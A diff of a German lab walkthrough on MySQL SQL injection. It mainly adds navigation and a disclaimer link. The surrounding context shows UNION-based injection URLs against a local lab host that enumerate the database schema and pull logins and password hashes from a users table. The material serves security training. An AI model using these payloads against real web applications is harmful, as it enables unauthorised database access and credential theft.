@@ -1,8 +1,19 @@
 # SQL Injection to Shell – Exploitation Walkthrough
 
-Dieses Dokument beschreibt einen vollständigen SQL-Injection-Angriff mit dem Ziel, Informationen aus der Datenbank zu extrahieren und Zugangsdaten zu erlangen. Die genutzte Zielanwendung basiert auf einer MySQL-Datenbank.
+---
 
-## 📌 Kontext
+## Inhaltsverzeichnis
+- [Einleitung](#einleitung)
+- [Erste Tests](#erste-tests)
+- [Datenbankaufbau erkunden](#datenbankaufbau-erkunden)
+- [Benutzeranmeldeinformationen extrahieren](#benutzeranmeldeinformationen-extrahieren)
+- [Haftungsausschluss](#haftungsausschluss)
+
+---
+
+## Einleitung
+
+Dieses Dokument beschreibt einen vollständigen SQL-Injection-Angriff mit dem Ziel, Informationen aus der Datenbank zu extrahieren und Zugangsdaten zu erlangen. Die genutzte Zielanwendung basiert auf einer MySQL-Datenbank.
 
 - **MySQL-Version:** 5.1.63-0+squeeze1  
 - **Datenbank:** photoblog  
@@ -13,7 +24,7 @@ Ziel der folgenden Schritte ist es, über SQL Injection Zugriff auf sensible Dat
 
 ---
 
-## 🔍 Erste Tests
+## Erste Tests
 
 ### Basistest
 ```http:
@@ -37,7 +48,13 @@ http://192.168.1.142/cat.php?id=2 UNION SELECT 1,user(),3,4 --+
 
 --- 
 
-## 📂 Datenbankaufbau erkunden
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+## Datenbankaufbau erkunden
 
 ### Datenbanken auflisten
 
@@ -79,7 +96,13 @@ UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHE
 
 ---
 
-## 🔓 Benutzeranmeldeinformationen extrahieren
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+## Benutzeranmeldeinformationen extrahieren
 
 ```http
 http://192.168.1.142/cat.php?id=2 UNION SELECT 1,group_concat(id,0x3a3a,login,0x3a3a,password),3,4 FROM users
@@ -97,7 +120,7 @@ http://192.168.1.142/cat.php?id=2 UNION SELECT 1,group_concat(id,0x3a3a,login,0x
 
 ---
 
-## ⚠️ Haftungsausschluss
+## Haftungsausschluss
 
 Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.
 
@@ -106,9 +129,19 @@ Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisi
 Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
 Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.
 
+[Disclaimer](/00-disclaimer/disclaimer.md)
+
 --- 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 Stay curious – stay secure. 🔐
 
-🗓️ **Letzte Aktualisierung:** Juli 2025  
+🗓️ **Letzte Aktualisierung:** August 2025  
 🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!
+
+---
